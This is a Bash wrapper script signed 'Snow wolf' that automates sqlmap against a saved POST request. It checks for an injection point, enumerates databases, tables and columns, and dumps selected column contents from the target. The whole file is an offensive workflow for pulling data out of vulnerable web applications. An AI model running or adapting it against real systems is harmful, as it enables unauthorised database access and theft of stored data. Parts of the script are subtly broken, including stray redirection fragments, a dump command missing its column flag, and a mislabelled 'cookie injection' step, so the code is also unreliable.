#!/bin/bash
RED="\033[31m"
GREEN="\033[32m"
BLUE="\033[34m"
RESET="\033[0m"
PYTHON="/usr/bin/python"
SQLMAP_PATH=/usr/share/sqlmap/sqlmap.py
BASH=/bin/bash
echo  -e "$BLUE \033[05m
PPPPPPP   OOOOOOO  SSSSSSSSS TTTTTTTTTTTT
P      P OO     OO SS             TT
P      P OO     OO SS             TT
PPPPPPP  OO     OO SSSSSSSSS      TT
P        OO     OO  SSSSSSSS      TT
P        OO     OO        SS      TT
P        OO     OO        SS      TT
P        OO     OO  SSSSSSSS      TT
P         OOOOOOO  SSSSSSSSS      TT
BY:Snow wolf
$RESET"
read -p 'Please input file location:' FILE
echo -e "[$BLUE cookie injection ...... $RESET]"
$PYTHON $SQLMAP_PATH -r $FILE  --batch &> sqlmap/log/post.txt && &> /dev/null
             grep "Parameter: id" sqlmap/log/post.txt &> /dev/null
                 if [ $? -eq 0 ]
                     then
                           echo -e   "injection point:	[$GREEN OK $RESET]"
                 elif [ $? -ne 0 ]
                     then
	                  echo  -e "injection point:	[$RED FAIL $RESET]"
                 
                          exit
                  fi
read  -p 'do you look databases?(y/n):' DATABASES
case $DATABASES in
y | Y)echo
           echo -e  "[$BLUE DETECTION..... $RESET]" && $PYTHON $SQLMAP_PATH -r $FILE --batch --dbs &> sqlmap/log/databases.txt && &> /dev/null
           grep -v [[starting]] sqlmap/log/databases.txt  | tail -n10  | grep [*]
           echo -e  "[$GREEN databases ok $RESET]"
           ;;
n | N)echo
            echo  -e "[$RED No prompt help message $RESET]"
            exit 1
            ;;
esac
read  -p 'do you need look tables?(y/n):' TABLES
case $TABLES in
y | Y)echo
             read  -p 'please input database name:' DATA
             echo -e  "[$BLUE DETECTION..... $RESET]" && $PYTHON $SQLMAP_PATH -r $FILE --batch -D $DATA --tables &> sqlmap/log/tables.txt && &> /dev/null
             grep -v [[starting]] sqlmap/log/tables.txt  | tail -n40  | grep [\|]
             echo -e "[$GREEN TABLES OK $RESET]"
             ;;
n | N)echo
             echo  -e "$RED No prompt help message $RESET"
             exit 1
              ;;
esac
read -p 'do you look tables columns?(y/n):' COLUMN
case $COLUMN in
y | Y)echo
             read -p 'please input tables name:' TABLE_NAME
             echo -e  "[$BLUE DETECTION..... $RESET]" && $PYTHON $SQLMAP_PATH -r $FILE --batch -D $DATA -T $TABLE_NAME --columns &> sqlmap/log/columns.txt && &> /dev/null
             grep -v [[starting]] sqlmap/log/columns.txt  | tail -n20  | grep [\|]
             echo -e "$GREEN columns ok $RESET"
            ;;
n | N)echo
             echo -e "$RED NO prompt help message $RESET"
             exit 1
             ;;
esac
read -p 'do you want to check the contents of the table?(y/n):' DUMP_TABLE
case $DUMP_TABLE in
y | Y) echo
             read -p 'please input columns zhi1:' COLUMN_ZHI
             read -p 'please input columns zhi2:' COLUMN_ZHI2
             echo -e  "[$BLUE DETECTION..... $RESET]" && $PYTHON $SQLMAP_PATH -r $FILE --batch -D $DATA -T $TABLE_NAME  $COLUMN_ZHI,$COLUMN_ZHI2 --dump &> sqlmap/log/column_zhi.txt && &> /dev/null
            grep -v [[starting]] sqlmap/log/column_zhi.txt | tail -n20 | grep [\|] | grep -v [[]
            echo -e "$GREEN table columns ok $RESET"
            ;;
n | N)echo
             echo -e "$RED NO prompt help message $RESET"
             exit 1
             ;;
esac
$BASH sqlmap/snowwolf-sqlmap.sh
